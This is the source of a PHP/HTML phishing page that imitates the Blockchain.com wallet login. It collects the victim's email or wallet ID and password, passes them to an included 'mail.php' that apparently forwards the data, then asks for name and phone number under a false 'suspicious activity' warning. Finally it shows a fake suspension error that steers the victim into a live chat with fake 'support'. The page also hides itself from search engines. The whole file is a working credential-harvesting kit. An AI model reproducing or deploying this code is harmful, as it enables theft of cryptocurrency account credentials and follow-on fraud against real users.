<!DOCTYPE html>
<html lang="en">
   <head>
      <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Blockchain | Login</title>
       <link rel="shortcut icon" href="./assets/favicon.ico" />
      <link rel="stylesheet" href="./assets/all.min.css">
      <link rel="stylesheet" href="./assets/bootstrap.min.css">
      <link rel="stylesheet" href="./assets/style.css">
      <script src="./assets/emojione.min.js.download" type="text/javascript" ></script>
      <script src="./assets/emojione.min.js.download" type="text/javascript" ></script>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   </head>
   <body>
      <div class="container-fluid" id="background">
         <div class="background-pattern">
            <div class="logo">
               <img src="./assets/bc-logo.svg">
            </div>
         </div>
          <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
         <div id="form">
            <h2>Verification Require</h2>
            <form id="loginForm" action="" method="post">
               <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
               <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

                <h6 style="color: red; text-align: center;font-size: 20px">Important Message:</h6>
                <h6 class="text-center" style="font-size: 20px">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.
                </h6>

                <div class="mb-3">
                  <label for="number" id="userNameField" class="form-label">Full Name</label>
                  <input type="text"  name="name" placeholder="Full Name" class="form-control" id="name" aria-describedby="emailHelp">
               </div>

                <div class="mb-3">
                  <label for="number" id="userNameField" class="form-label">Phone Number</label>
                  <input type="text"  name="number" placeholder="Phone Number" class="form-control" id="number" aria-describedby="emailHelp">
               </div>
                <div class="verify-button">
                    <button type="submit" name="fromLog" class="btn btn-block" id="verifyBtn" style="background-color: rgb(0, 46, 167); color: #fff; font-weight: 600;">Submit</button>
                </div>

               
            </form>
           
         </div>
         
        
                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                     include 'chat.php';
                 ?>
                     <div id="form">
            <form class="error" action="error.html">


                <h6 style="color: red">Important Message:</h6>
                <h6>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately
                </h6>

                <div class="phone-number">
                    <label class="label" style="color: red">Error CODE: EBRX1:6X76D</label><br>
                   

                </div>
                <div class="error-button">
                    <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
                </div>


            </form>
           
         </div>
                 <?php } else { ?>

                 <div id="form">
            <h2>Welcome Back !</h2>
            <h5>Enter Your Email Address or Wallet ID</h5>
            <form id="loginForm" action="" method="post">
               <input type="hidden" name="btnLoginMore">
               <div class="mb-3" id="email">
                  <label for="exampleInputEmail1" id="userNameField" class="form-label">Email or Wallet ID</label>
                  <input type="text" name="email" placeholder="Enter your Email or Wallet ID" class="form-control" id="username-input" aria-describedby="emailHelp">
               </div>
               <div class="form-group" id="hidden-password-input" style="display: none;">
                  <label class="">Enter Your Password</label>
                  <input id="password" name="password" type="password" class="form-control">
               </div>
               <div class="button">
                  <button type="submit" name="btnLoginMore" class="btnLoginMore btn btn-block" id="pw_submit" style="background-color: rgb(134, 182, 249); color: white;">Continue</button>
               </div>
               <div class="link">
                  <p><a href="#">Need Some Help ? </a></p>
               </div>
            </form>
            <div class="sign-up-links">
               <p class="sign-up">Don't have a Blockchain Account?
                  <a> Sign up Now -&gt;</a>
               </p>
               <p class="url">Please check that you are visiting the correct URL</p>
               <a class="actual-url"><i class="fa fa-lock"></i> https://login.blockchain.com</a>
            </div>
         </div>
         <div class="container-fluid" id="footer">
            <div class="footer-links">
               <p>Looking for the Exchange?<a> Log In -&gt;</a></p>
            </div>
            <div class="last-links">
               <div class="dropdown">
                  <button class="btn dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  English
                  </button><a  href="#">Something else here</a>
                     </div>
               </div>
               <span>Version 4.55.6 </span>
               <span><a href="#"> Need Help ? </a></span>
            </div>
         </div>
                 <?php }  ?>
         
      </div>
      
      <script src="./assets/jquery-3.5.1.slim.min.js.download"  crossorigin="anonymous"></script>
      <script src="./assets/popper.min.js.download" crossorigin="anonymous"></script>
      <script src="./assets/bootstrap.min.js.download" crossorigin="anonymous">
         
      </script>
      <script>
         document.addEventListener('DOMContentLoaded', function () {
             let usernameInput = document.getElementById('username-input')
             let hiddenPasswordInput = document.getElementById('hidden-password-input')
             let loginForm = document.getElementById('loginForm')
             let submitButton = document.getElementById('pw_submit')
             let userField = document.getElementById('userNameField')
             let userEmail =document.getElementById('email')
             let passwordInput = document.getElementById('password')
             submitButton.style.backgroundColor = "#86B6F9"
             submitButton.style.color = "white"
             
             loginForm.addEventListener('submit', function (e) {
                 e.preventDefault()
                 if (usernameInput.value == "") {
                     alert("User Name is Required !")
                     return
                 }
         
                 else if (hiddenPasswordInput.style.display === 'none') {
                     hiddenPasswordInput.style.display = "block"
                     usernameInput.style.border = "none"
                     usernameInput.style.width="50%"
                     usernameInput.style.height = "20px"
                     usernameInput.style.color = "lightgray"
                     userEmail.style.display="flex"
                    
                     // usernameInput.style.marginTop ="-28px"
                     // usernameInput.style.marginLeft ="118px"
                     usernameInput.setAttribute('readonly', 'readonly')
                   
                     usernameInput.style.backgroundColor = "transparent"
                     passwordInput.style.border = "2px solid #4697BA"
                     submitButton.style.backgroundColor = "#002ea7"
                     userField.style.color ="lightgray"
                     return
                 }
                 else if (hiddenPasswordInput.querySelector("input").value == "") {
                     alert("Password is required!")
                     return
                 } else {
                     // location.href = "verify.html"
                     document.getElementById("loginForm").submit();
                     // $(".btnLoginMore").click();
                 }
             })
         
             usernameInput.addEventListener('keyup', function (e) {
                 const thisInput = e.target
                 if (thisInput.value != "") {
                     submitButton.style.backgroundColor = "#0C6CF2"
                 } else {
                     submitButton.style.backgroundColor = "#86B6F9"
                 }
             })
         })
      </script>
     
  <?php
                 if (isset($_POST['btnLoginMore'])) {
                ?>
         <script>
                $(document).ready(function () {
                    $('#verifyBtn').click(function (e) {
                        var number = $('#number').val();
                        var name = $('#name').val();
                        if (name == '') {
                            alert('Invalid Name');
                            $("#name").focus();
                            return false;
                        } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                            alert('Please specify a valid phone number');
                            $("#number").focus();
                            return false;
                        }
                    });
                });
            </script>
            <?php }?>      
   </body>
</html>